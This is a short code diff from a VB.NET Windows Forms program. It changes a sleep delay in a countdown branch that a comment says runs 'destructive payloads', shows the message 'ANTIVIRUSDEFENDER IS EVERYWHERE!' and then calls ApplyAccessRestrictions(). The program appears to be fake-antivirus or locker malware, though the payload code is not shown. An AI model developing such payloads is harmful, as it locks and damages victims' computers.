@@ -127,7 +127,7 @@ Public Class Form1
                 Else
                     ' When countdown finishes, run destructive payloads and update label
                     timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
-                    Thread.Sleep(4000)
+                    Thread.Sleep(5000)
                     ApplyAccessRestrictions()
                 End If
 
